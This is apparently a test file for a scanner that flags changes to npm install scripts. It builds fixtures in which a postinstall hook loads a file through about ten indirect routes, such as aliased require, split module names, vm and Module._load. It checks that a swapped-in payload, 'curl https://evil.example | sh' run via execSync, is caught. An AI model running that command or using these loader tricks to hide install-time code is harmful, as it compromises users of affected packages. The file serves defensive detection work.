import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const evil = "require('child_process').execSync('curl https://evil.example | sh')\n";
const nj = (body: string): Record<string, string> => ({ "package.json": pj({ postinstall: "node install.js" }), "install.js": body, "lib/a.js": "1\n" });

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(hard(base, base)).toEqual([]);
}

const cases: [string, Record<string, string>, string, string][] = [
  ["C1 module.require computed", nj("module.require(__dirname+'/lib/a.js')\n"), "lib/a.js", evil],
  ["C2 createRequire computed", nj("const {createRequire}=require('module');createRequire(__filename)(__dirname+'/lib/a.js')\n"), "lib/a.js", evil],
  ["C3 aliased require", nj("const r=require;r(__dirname+'/lib/a.js')\n"), "lib/a.js", evil],
  ["C4 worker_threads Worker", nj("const {Worker}=require('worker_threads');new Worker(__dirname+'/lib/a.js')\n"), "lib/a.js", evil],
  ["C5 split child_process name", nj("const {fork:f}=require('child_'+'process');f(__dirname+'/lib/a.js')\n"), "lib/a.js", evil],
  ["C6 Function without new", nj("Function(require('fs').readFileSync(__dirname+'/lib/a.js','utf8'))()\n"), "lib/a.js", evil],
  ["C7 Module._load", nj("require('module')._load(__dirname+'/lib/a.js')\n"), "lib/a.js", evil],
  ["C8 module._compile", nj("const fs=require('fs');module._compile(fs.readFileSync(__dirname+'/lib/a.js','utf8'),'x')\n"), "lib/a.js", evil],
  ["C9 import vm from", { "package.json": pj({ postinstall: "node install.mjs" }), "install.mjs": "import v from 'node:vm';import fs from 'fs';v.runInThisContext(fs.readFileSync(new URL('./lib/a.js',import.meta.url),'utf8'))\n", "lib/a.js": "1\n" }, "lib/a.js", evil],
  ["C10 require.call", nj("require.call(null,__dirname+'/lib/a.js')\n"), "lib/a.js", evil],
];

for (const [name, base, file, bad] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
  });
}

test("a static module.exports require does not widen to an unreferenced file", () => {
  const base = nj("module.exports = require('./lib/a')\n");
  base["other.js"] = "1\n";
  expect(hard(base, { ...base, "other.js": evil })).toEqual([]);
  holds(base, "lib/a.js", evil);
});

test("README, docs, and a CI workflow stay quiet unless the hook names that file", () => {
  const wide = {
    "package.json": pj({ postinstall: "python3 -c 'print(1)'" }),
    "src/x.js": "1\n",
    "README.md": "a\n",
    "docs/extra.js": "1\n",
    ".github/workflows/ci.yml": "a\n",
  };
  holds(wide, "src/x.js", evil);
  expect(hard(wide, { ...wide, "README.md": "b\n" })).toEqual([]);
  expect(hard(wide, { ...wide, "docs/extra.js": evil })).toEqual([]);
  expect(hard(wide, { ...wide, ".github/workflows/ci.yml": "b\n" })).toEqual([]);
  const named = {
    "package.json": pj({ postinstall: "python3 doc/setup.py" }),
    "doc/setup.py": "x=1\n",
    "README": "a\n",
  };
  holds(named, "doc/setup.py", "import os\n");
  expect(hard(named, { ...named, "README": "b\n" })).toEqual([]);
});
